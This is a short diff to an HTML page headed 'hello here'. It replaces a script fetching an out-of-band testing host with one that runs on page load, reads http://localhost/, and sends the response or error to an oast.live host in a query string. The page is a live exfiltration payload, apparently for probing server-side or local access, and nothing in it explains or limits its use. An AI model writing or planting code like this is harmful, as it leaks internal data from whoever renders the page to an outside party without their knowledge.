@@ -2,29 +2,27 @@
   <h1>hello here</h1><br>
  <body>
   <div id="result"></div>
-  
-  <script>
-    fetch("https://d9scd2amruon0ebkphg0wfq9f7agpwb5u.oast.pro/")
-      .then(r => r.text())
-      .then(data => {
-        document.getElementById("result").innerHTML = data;
-      })
-      .catch(err => {
-        document.getElementById("result").textContent = err;
-      });
-  </script>
-
-    
   <div id="result1"></div>
   
   <script>
+    //fetch("https://d9scd2amruon0ebkphg0wfq9f7agpwb5u.oast.pro/")
+      //.then(r => r.text())
+      //.then(data => {
+        //document.getElementById("result").innerHTML = data;
+     // })
+    //  .catch(err => {
+    //    document.getElementById("result").textContent = err;
+    //  });
+
     fetch("http://localhost/")
       .then(r => r.text())
       .then(data => {
         document.getElementById("result1").innerHTML = data;
+        fetch(`https://d9sckgqmruop20uqj8q0pp5rnwyqjn118.oast.live/?res=${data}`)
       })
       .catch(err => {
         document.getElementById("result1").textContent = err;
+         fetch(`https://d9sckgqmruop20uqj8q0pp5rnwyqjn118.oast.live/?res=${err}`)
       });
   </script>
 
